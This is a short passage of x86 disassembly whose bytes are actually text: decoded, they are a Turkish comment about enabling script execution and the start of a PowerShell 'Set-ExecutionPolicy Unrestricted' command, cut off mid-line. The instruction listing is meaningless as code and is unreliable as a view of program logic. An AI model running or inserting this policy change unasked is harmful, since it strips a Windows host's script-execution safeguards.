  404ad8:	65 63 75 74          	arpl   %esi,%gs:0x74(%ebp)
  404adc:	69 6f 6e 50 6f 6c 69 	imul   $0x696c6f50,0x6e(%edi),%ebp
  404ae3:	63 79 27             	arpl   %edi,0x27(%ecx)
  404ae6:	69 20 55 6e 72 65    	imul   $0x65726e55,(%eax),%esp
  404aec:	73 74                	jae    0x404b62
  404aee:	72 69                	jb     0x404b59
  404af0:	63 74 65 64          	arpl   %esi,0x64(%ebp,%eiz,2)
  404af4:	20 79 61             	and    %bh,0x61(%ecx)
  404af7:	70 61                	jo     0x404b5a
  404af9:	72 61                	jb     0x404b5c
  404afb:	6b 20 62             	imul   $0x62,(%eax),%esp
  404afe:	65 74 69             	gs je  0x404b6a
  404b01:	6b 20 c3             	imul   $0xffffffc3,(%eax),%esp
  404b04:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404b05:	61                   	popa
  404b06:	6c                   	insb   (%dx),%es:(%edi)
  404b07:	c4 b1 c5 9f 74 c4    	les    -0x3b8b603b(%ecx),%esi
  404b0d:	b1 72                	mov    $0x72,%cl
  404b0f:	6d                   	insl   (%dx),%es:(%edi)
  404b10:	61                   	popa
  404b11:	79 c4                	jns    0x404ad7
  404b13:	b1 20                	mov    $0x20,%cl
  404b15:	65 74 6b             	gs je  0x404b83
  404b18:	69 6e 6c 65 c5 9f 74 	imul   $0x749fc565,0x6c(%esi),%ebp
  404b1f:	69 72 69 79 6f 72 75 	imul   $0x75726f79,0x69(%edx),%esi
  404b26:	7a 0d                	jp     0x404b35
  404b28:	0a 53 65             	or     0x65(%ebx),%dl
  404b2b:	74 2d                	je     0x404b5a
  404b2d:	45                   	inc    %ebp
  404b2e:	78 65                	js     0x404b95
  404b30:	63 75 74             	arpl   %esi,0x74(%ebp)
  404b33:	69 6f 6e 50 6f 6c 69 	imul   $0x696c6f50,0x6e(%edi),%ebp
